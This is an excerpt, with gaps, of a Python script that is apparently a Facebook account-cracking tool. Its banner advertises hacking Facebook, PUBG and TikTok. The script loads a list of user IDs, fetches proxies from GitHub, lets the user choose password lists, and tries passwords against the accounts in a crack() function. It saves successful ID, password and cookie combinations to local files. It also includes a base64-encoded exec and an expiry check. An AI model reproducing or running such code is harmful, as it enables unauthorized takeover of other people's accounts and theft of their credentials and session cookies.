#خوشکت بەکێرم بیبەیت و تاگم نەکەی یان ئیدیت بکەی
...
g= datetime.datetime(2024, 5, 5, 11, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("    "+ '\033[1;32m DECODE BY KURSATI')
 print('\n\n')
 print(x)
...
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    #print("    "+ 'WARING THE TOOL CODEING BY ANAS\nTOOL EXPIERE\nBO KRINI TOOL NAMA BNERA BO \033[1;32m@MR_A_N_4_S')
    print('\n\n')
    print(x)
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;96m[Welcome')
...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/Blackhackerx/FINDIP/main/http_proxies.txt').text
		ua=open('.bbnew.txt','w')
...
exec(base64.b64decode("cHJpbnQoJ1wwMzNbMTszMm0gREVDT0RFIEJZIEk0TV9TVEFSJyk="))
def clear():
    os.system('clear')
    banner()
...
\033[1;37m-----------------\033[1;34m-------------\033[1;32m------------
⋘─────ミƘմɾՏɑԵí¹⁸⁸⁶ミ─────⋙\x1b[37;5;200m 
Don't decode frinds😂\x1b[38;5;208m
քʀɨƈɛ𐀀օօʟ : 𝖯𝗋𝖾𝗆𝗂𝗎𝗇🔒   \x1b[35;7;27m 
𝐓𝐞𝐚𝐦  : A͠r͠a͠ K͠u͠r͠s͠a͠t͠i͠📆\x1b[34;5;211m
𝚃𝚑𝚒𝚜 𝚃𝚘𝚘𝚕 𝙵𝚘𝚛\x1b[1;92m
❖ - 𝙷𝙰𝙲𝙺 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺\x1b[1;91m
❖ - 𝙷𝙰𝙲𝙺 𝙿𝚄𝙱𝙶 𝙼𝙾𝙱𝙸𝙻𝙴 \x1b[33;5;211m
❖ - 𝙷𝙰𝙲𝙺 𝚃𝙸𝙺 𝚃𝙾𝙺\x1b[38;5;225m
⋘─────ミƘմɾՏɑԵí¹⁸⁸⁶ミ─────⋙\x1b[38;5;100m   
\033[1;37m-----------------\033[1;34m-------------\033[1;32m------------
""")
...
def xxxid():
 ...
 if 1==1:
   os.system('clear')
   print("\033[92m 𝗬𝗼𝗿 𝗸𝗲𝘆 𝗶𝘀 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱.....")
   menu()
   time.sleep(1)
   pass
  ...
  # else:
   # os.system('clear')
   # print("\033[91m 𝗦𝗼𝗿𝗿𝘆 𝗯𝗿𝗼 𝘁𝗵𝗶𝘀 𝘁𝗼𝗼𝗹 𝗶𝘀 𝗽𝗮𝗶𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝘁𝗼 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆 𝘀𝗲𝗻𝗱 𝗰𝗵𝗮𝘁 𝘁𝗼 𝗼𝘄𝗻𝗲𝗿 @MR_A_N_4_S  ")
   # time.sleep(1)
   # exit()
 # except (Exception,KeyError,ConnectionError,ValueError):
  # print('Send Message For Owner >>> https://t.me/MR_A_N_4_S')
  # #webbrowser.open('https://t.me/MR_A_N_4_S')
  # print('\033[91mConnection Error')
  # exit()
  # menu()
def run():
  os.system('clear')
  name=input(' 𝐄𝐧𝐭𝐞𝐫 𝐘𝐨𝐮𝐫 𝐍𝐚𝐦𝐞 : ')
  iq1 = (str(os.getegid()).join(str(os.geteuid())).join(str(os.getlogin())))
  iq2 = ((str(os.geteuid()).join(str(os.getlogin()))).join('0864213579'))[::-1]
  iq22 = (str(os.geteuid()).join(str(os.getlogin())))
...
class D:
	...
	def plerr(self):
		...
		try:
			...
			fileX = input (WHITE+' 𝐄𝐧𝐭𝐞𝐫 𝐅𝐢𝐥𝐞 𝐍𝐚𝐦𝐞 : ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(WHITE+'ƬOƬᗩᒪ Ɩᗪᔕ : '+str(len(id)))
			for i in range(101):
				print("\rᴸᴼᴬᴰᴵᴺᴳ => "+str(i)+"%",end="")
				time.sleep(0.02)
			Settings()
		except IOError:
...
def Settings():
	...
	if hu in ['1','01']:
		...
		exit()
	write("-"*30)
	print(f' [ 01 ] ʍ乇ｲんℴ𝒹 ｷﾑ丂ｲ')
	hc = input(WHITE+' 丂乇ﾚ乇cｲ => ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	write("-"*30)
	pwplus=input(WHITE+' [ 01 ] 𝐍𝐨𝐫𝐦𝐚𝐥\n [ 02 ] 𝖥𝖺s𝗍\n SELECT => ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	banner()
	write(" "+"-"*50)
	write(" [+] 𝒟𝒜𝒯ℰ : "+str(ha)+"-"+str(bu)+"-"+str(ta))
	write(" "+"-"*50)
	write(" [+] т✺тᾰℓ !ᖱṧ = \u001b[32;1m"+str(len(id)))
	write(" \u001b[0m[+] 𝖢𝖱𝖠𝖢𝖪𝖨𝖭𝖦 𝖧𝖠𝖲 𝖲𝖳𝖠𝖱𝖳𝖤𝖣")
	write(" [+] kႮRႽ𐌀𐌕i 𐌕ტტl 𐌀ოiɀiႶᏳ")
	write(" [+] ᶠᵁᶜᴷᴵᴺᴳ ᵀᴴᴱ ˢᵞˢᵀᴱᴹ")
	write(" [+] Ѳωиɛя Ƭσσℓ✫彡𐀁яα Ƙʋяƨαтι")
	write(" "+"-"*50)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[𝒜𝓇𝒶]\u001b[0m[ꀘꀎꋪꌗꍏ꓄ꀤ] [{loop}|{len(id)}] [\u001b[32;1m{str(ok)}\u001b[0m=\u001b[33;1m{str(cp)}\u001b \u001b[0m]"),sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\u001b[0;92m\n[𝐀𝐑𝐀-𝐎𝐊👾] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;94m[🍪]= COOKIES • \033[0;95m{kuki} ')
				os.system('espeak -a 500 " Ara,  Kursati,   Fb,  Ok,  id"')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				open("/sdcard/𝐊𝐔𝐑𝐒𝐀𝐓𝐈.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
